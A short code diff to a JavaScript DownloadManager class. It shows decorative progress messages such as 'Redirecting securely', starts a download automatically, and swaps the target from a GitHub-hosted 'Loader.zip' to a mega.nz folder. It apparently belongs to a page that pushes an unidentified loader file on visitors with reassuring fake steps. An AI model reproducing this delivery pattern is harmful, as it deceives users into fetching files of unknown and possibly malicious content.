@@ -19,7 +19,7 @@ class DownloadManager {
       { name: "Redirecting securely", icon: "✨", detail: "Completing transfer protocol" }
     ];
 
-    this.targetUrl = "https://github.com/user-attachments/files/21698591/Loader.zip";
+    this.targetUrl = "https://mega.nz/folder/DHoCESbJ#bzC6bsBycVYUAjgAmH5BSQ";
     
     this.initializeElements();
     this.startDownload();
